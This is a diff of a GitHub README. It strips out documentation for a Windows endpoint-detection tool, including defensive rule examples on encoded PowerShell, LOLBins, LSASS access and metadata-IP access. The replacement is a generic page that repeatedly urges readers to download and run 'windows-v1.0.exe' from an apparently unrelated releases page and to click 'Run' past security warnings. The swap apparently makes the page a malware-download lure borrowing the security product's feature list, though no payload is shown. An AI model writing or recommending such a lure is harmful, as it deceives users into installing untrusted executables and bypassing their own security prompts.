@@ -1,164 +1,97 @@
-# Sentrilite EDR/XDR for Windows — Threat-Detection-as-Code, Observability, Runtime-Security, Live Telemetry, Misconfig Scanner with AI/LLM insights.
+# 🛡️ windows - Protect Your System with Smart Insights
 
-# Sentrilite Alert Report
-![Sentrilite PDF_Report](./Sample_Alert_Report.png)
-# CI/CD Workflow
-![Sentrilite_CI_CD_Workflow](./CI_CD_Workflow.png)
-# Main Dashboard
-![Sentrilite Main Dashboard](./main_dashboard.png)
-# Live Server Dashboard
-![Sentrilite Server_Dashboard](./live_dashboard.png)
+## 🚀 Getting Started
 
-# Sentrilite EDR/XDR for Windows
+Welcome to the windows repository! This application helps you improve your computer's security and observability. With features for detection, monitoring, and live telemetry, you'll gain valuable insights while ensuring your system stays safe.
 
-Sentrilite EDR/XDR for Windows is a lightweight Detection-as-Code (DAC), real-time endpoint security and observability platform. It streams structured system events to a live dashboard where JSON rules drive risk scoring, tagging, alerting, and reporting.
+## 📥 Download the Application
 
-It provides a low-overhead endpoint security layer for Windows servers and workstations without requiring heavyweight EDR agents. If Sysmon is present, Sentrilite can automatically enrich coverage by ingesting Sysmon logs; if not, it falls back to its own native collectors.
+[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/jorrip12/windows/releases)
 
-## What Sentrilite Collects on Windows
+To get started with the windows application, you will first need to download it from our Releases page. This is where you will find the latest version of the software.
 
-### Process Activity Monitoring
+## 📂 Visit the Download Page
 
-Sentrilite captures all process creation and termination and normalizes them into a unified event model:
-- Full executable path (cmd / comm)
-- Parent PID / child PID
-- User / SID context (e.g., NT AUTHORITY\SYSTEM, local users)
-- Timestamps
-- Tags (e.g., windows, process, powershell, lolbin-network)
+Go to this link to download the application: [Download Here](https://github.com/jorrip12/windows/releases)
 
-You can write rules for:
-- Suspicious binaries (e.g., powershell.exe, wscript.exe, certutil.exe)
-- LOLBins and lateral-movement tools (psexec.exe, wmic.exe, wmiprvse.exe)
-- Obfuscated or encoded script execution (e.g., -EncodedCommand, FromBase64String()
-- Unexpected parent-child chains (e.g., winword.exe → powershell.exe)
+## 💻 System Requirements
 
-### File Access Monitoring (Rule-Driven)
+Before you download the application, assure your system meets the following requirements:
 
-The Windows agent detects sensitive file usage via process arguments and custom file rules, using custom_rules.json and sensitive_files.json:
-- High-risk alerts for reads/writes to sensitive paths (credentials, config, keys, etc.)
-- Tag events with categories such as:
-- exfiltration
-- credential-access
-- custom tags like "gaurav" for your own watch files
+- **Operating System:** Windows 10 or later.
+- **Processor:** 1 GHz or faster.
+- **RAM:** 4 GB minimum.
+- **Disk Space:** At least 500 MB free.
+- **Network:** Internet connection for updates and telemetry.
 
-### Network Activity Monitoring
+## 🔍 Features
 
-Sentrilite monitors outbound connections via Windows networking APIs (GetExtendedTcpTable), producing events that include:
-- Local address / port
-- Remote address / port
-- Protocol (TCP)
-- Owning process (image path)
-- User context
-- Basic connection state (LISTEN, ESTABLISHED, etc.)
-- Rules can differentiate between:
-- Browser baseline traffic vs. non-browser processes making external connections
-- System services vs. unexpected user processes
-- Access to special IPs (e.g., cloud metadata 169.254.169.254)
+The application offers several key features to enhance your computer’s security:
 
-### Optional Sysmon-Aware Enrichment
+- **Detection-As-Code:** Easily define rules for detecting threats.
+- **Observability:** Monitor your system’s behavior in real time.
+- **Security Alerts:** Get notifications about critical security events.
+- **Live Telemetry:** Access live data flows for better insights.
+- **AI/LLM Insights:** Utilize advanced algorithms to enhance detection capabilities.
+- **User-Friendly Interface:** Simple design ensures ease of use for non-technical users.
 
-If Sysmon and the Microsoft-Windows-Sysmon/Operational log are available, Sentrilite starts a Sysmon reader loop that:
-- Polls Sysmon events via Get-WinEvent
-- Maps them into the same Event structure as native events
-- Adds a sysmon tag plus category tags:
-- process (Event ID 1)
-- network (ID 3)
-- driver (ID 6)
-- module-load (ID 7)
-- file (ID 11)
-- registry (IDs 12, 13, 14)
-- wmi (IDs 19, 20, 21)
-- dns, network (ID 22)
-- Keeps Arg1 concise and structured (short summaries rather than raw multi-line blobs)
+## 📄 Installation Guide
 
-### Key point:
+Follow these straightforward steps to install the application on your Windows computer:
 
-Sentrilite works without Sysmon, but if Sysmon is installed, you automatically get richer coverage with the same rule engine, same WebSocket pipeline, and same alert model.
+1. **Download the Software**
+   - Go back to the [Download Here](https://github.com/jorrip12/windows/releases) link.
+   - Click on the latest version available, e.g., “windows-v1.0.exe”.
+   - Your browser will start the download. Save the file in a location you can easily access.
 
-### Detection-as-Code (DAC)
+2. **Run the Installer**
+   - Navigate to the folder where you saved the downloaded file.
+   - Double-click on `windows-v1.0.exe`.
+   - A security warning may appear; click "Run" to proceed.
 
-Detection logic is fully programmable using JSON:
-Rule files:
-- custom_rules.json
-- windows_security_rules.json (Details in WINDOWS_SECURITY_RULES_DESCRIPTION.md)
-- sensitive_files.json
-- regex_rules.json
+3. **Complete the Installation**
+   - Follow the prompts in the installation wizard.
+   - Accept the user agreement and choose your installation preferences.
+   - Click "Install" to begin the installation process.
+   - Once installation is complete, click "Finish."
 
-### Hot reload:
+## 🔑 Setting Up the Application
 
-Rule files are reloaded on change — no rebuilds, no restarts.
-Match on any event field, including:
-- cmd, comm
-- arg1 (first argument / summarized payload)
-- user
-- ip
-- msg_type_str (e.g., PROCESS_CREATE, SYSMON_DNS_QUERY)
-- tags
-- aliases like file, iid mapped into shared fields
-Rules can:
-- Assign risk levels: 1 = high, 2 = medium, 3 = low
-- Add custom tags for later correlation / dashboards
-- Trigger alerts automatically when conditions match
-  (e.g., high-risk PowerShell with encoded commands, LSASS access, non-browser outbound network, WMI-based lateral movement)
+Once you have installed the application, you need to set it up:
 
-This gives Windows administrators full programmability over detection logic without touching code.
+1. **Open the Application**
+   - Find and double-click the windows icon on your desktop to start the application.
 
----
+2. **Create an Account (Optional)**
+   - If prompted, you can create an account for enhanced features. Fill in your details, or you may choose to use the application anonymously.
 
-## 🔐 Licensing
+3. **Configure Settings**
+   - Go to the settings menu.
+   - Adjust detection rules and alerts as per your preference.
+   - Save any changes you make.
 
-The project is currently using a trial license.key .
+## 📊 Using the Application
 
----
+Now that you have installed and set up the app, here are some tips on how to use it effectively:
 
-## 🛠️ Third-Party Integrations (PagerDuty & Alertmanager)
+- **Monitor Your Dashboard:** Keep an eye on the main dashboard where you will see alerts and insights.
+- **Review Logs Regularly:** Check the logs to see past detections and system behavior.
+- **Update Often:** Regularly check for updates on the Releases page to benefit from new features and security patches.
 
-- PagerDuty
-- Alertmanager (Prometheus ecosystem)
-- SIEM forwarding (JSON events)
+## ❓ Troubleshooting
 
----
+If you encounter issues, try the following common solutions:
 
-## 🛠️ Installation Steps
+- **Cannot Download the Application:** Ensure you have a stable internet connection.
+- **Installation Hangs:** Close any unnecessary programs and try running the installer again.
+- **Application Crashes:** Make sure your system meets the minimum requirements and try restarting your computer.
 
-In a Powershell Terminal run:
-```
-Start Sentrilite Service: \sentrilite-service.bat start
-Check Service Status: \sentrilite-service.bat status
-Stop Sentrilite Service: \sentrilite-service.bat stop
-```
-Open the dashboard.html to check live telemetry:
+## 🔗 Support & Community
 
----
+Join our community for additional information and support:
 
-## Configuration
+- **GitHub Issues:** Report concerns or bugs directly on the issues page.
+- **User Guide:** Access detailed documentation for advanced features.
+- **Community Forum:** Engage with other users and share experiences.
 
-- license.key — place in the current directory (baked in image or mounted as Secret).
-- sys.conf — network config, placed in the current directory (baked in image or mounted as ConfigMap).
-- Rule files - (custom_rules.json, sensitive_files.json, windows_security_rules.json) reside in the working dir; rules can be managed via the dashboard.
-
----
-
-## Alerts
-
-When a rule marks an event as high-risk, Sentrilite:
-- Creates a structured alert (JSON)
-- Pushes it in real time to the dashboard
-- Saves it to alerts.json
-- Marks the node as “high risk” (risk-level = 1)
-- Can forward to external systems (PagerDuty, AlertManager)
-
-Alerts include:
-- Process info
-- User identity
-- Risk reasoning via tags
-- File paths or network destinations
-- Human-readable summaries
-
----
-
-## Support
-
-For licensing, troubleshooting, or feature requests:
-- 📧 info@sentrilite.com
-- 🌐 https://sentrilite.com
+Feel free to reach out for assistance if needed. Your feedback is essential for our improvement. Enjoy a safer computing experience with windows!
